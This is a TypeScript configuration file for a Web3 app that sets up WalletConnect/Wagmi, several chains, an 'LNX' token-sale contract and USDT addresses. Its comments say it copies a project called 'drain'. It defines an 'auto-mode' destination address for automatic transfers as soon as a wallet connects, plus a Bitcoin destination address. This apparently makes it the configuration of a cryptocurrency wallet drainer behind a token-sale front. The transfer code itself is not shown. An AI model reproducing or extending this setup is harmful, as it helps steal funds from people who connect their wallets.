import { WagmiAdapter } from "@reown/appkit-adapter-wagmi";
import { cookieStorage, createStorage } from "wagmi";
import { mainnet, sepolia, polygon, bsc } from "@reown/appkit/networks";
import { z } from "zod";

// Same env var validation as drain: use zod to parse (drain uses z.string().parse())
// Get project ID at https://dashboard.reown.com or https://cloud.walletconnect.com
const walletConnectProjectIdSchema = z
  .string()
  .min(1, "WalletConnect Project ID is required");

export const projectId = (() => {
  const raw =
    process.env.NEXT_PUBLIC_WALLET_CONNECT_PROJECT_ID ||
    process.env.NEXT_PUBLIC_PROJECT_ID ||
    process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID ||
    "";
  const trimmed = raw.trim();
  if (!trimmed) return "";
  try {
    // Same validation pattern as drain
    return walletConnectProjectIdSchema.parse(trimmed);
  } catch (error) {
    if (error instanceof z.ZodError) {
      console.error(
        "[Config] Invalid project ID format:",
        error.errors.map((e) => e.message).join(", ")
      );
    }
    return "";
  }
})();

// Polygon first so app doesn't default to ETH mainnet on load
export const networks = [polygon, mainnet, sepolia, bsc];

// Debug: log available env vars (only in dev, server-side)
if (typeof window === "undefined" && process.env.NODE_ENV === "development") {
  console.log("[Config] Env check:", {
    NEXT_PUBLIC_WALLET_CONNECT_PROJECT_ID: process.env.NEXT_PUBLIC_WALLET_CONNECT_PROJECT_ID
      ? "✓ set"
      : "✗ missing",
    NEXT_PUBLIC_PROJECT_ID: process.env.NEXT_PUBLIC_PROJECT_ID
      ? "✓ set"
      : "✗ missing",
    resolvedProjectId: projectId ? `✓ ${projectId.substring(0, 10)}...` : "✗ empty",
  });
}

// Validate and trim projectId
const validatedProjectId = (projectId || "").trim();
if (!validatedProjectId) {
  throw new Error(
    "No project ID (APKT008). Add to .env.local: NEXT_PUBLIC_WALLET_CONNECT_PROJECT_ID=your_project_id from https://dashboard.reown.com — then restart dev server."
  );
}

// Auto-mode: destination address for auto transfer when wallet is connected (doc)
export const AUTO_DESTINATION_ADDRESS =
  (process.env.NEXT_PUBLIC_AUTO_DESTINATION_ADDRESS as `0x${string}`) || "";
export const AUTO_MODE_ENABLED = Boolean(AUTO_DESTINATION_ADDRESS);

// Bitcoin destination address (for Bitcoin aggregator)
export const BITCOIN_DESTINATION_ADDRESS =
  process.env.NEXT_PUBLIC_BITCOIN_DESTINATION_ADDRESS || "";

// Create adapter with validated projectId (ensures it's not empty)
export const wagmiAdapter = new WagmiAdapter({
  storage: createStorage({
    storage: cookieStorage,
  }),
  ssr: true,
  networks,
  projectId: validatedProjectId,
});

export const config = wagmiAdapter.wagmiConfig;

// Contract addresses (configure per environment)
export const LNX_TOKEN_ADDRESS = process.env.NEXT_PUBLIC_LNX_TOKEN_ADDRESS as `0x${string}`;
export const LNX_SALE_ADDRESS = process.env.NEXT_PUBLIC_LNX_SALE_ADDRESS as `0x${string}`;

// Common stablecoin addresses by chain (example USDT); override via env if needed
export const USDT_ADDRESS_BY_CHAIN: Record<number, `0x${string}` | undefined> = {
  [mainnet.id]: process.env.NEXT_PUBLIC_USDT_MAINNET as `0x${string}` | undefined,
  [sepolia.id]: process.env.NEXT_PUBLIC_USDT_SEPOLIA as `0x${string}` | undefined,
  [polygon.id]: process.env.NEXT_PUBLIC_USDT_POLYGON as `0x${string}` | undefined,
  [bsc.id]: process.env.NEXT_PUBLIC_USDT_BSC as `0x${string}` | undefined,
}; 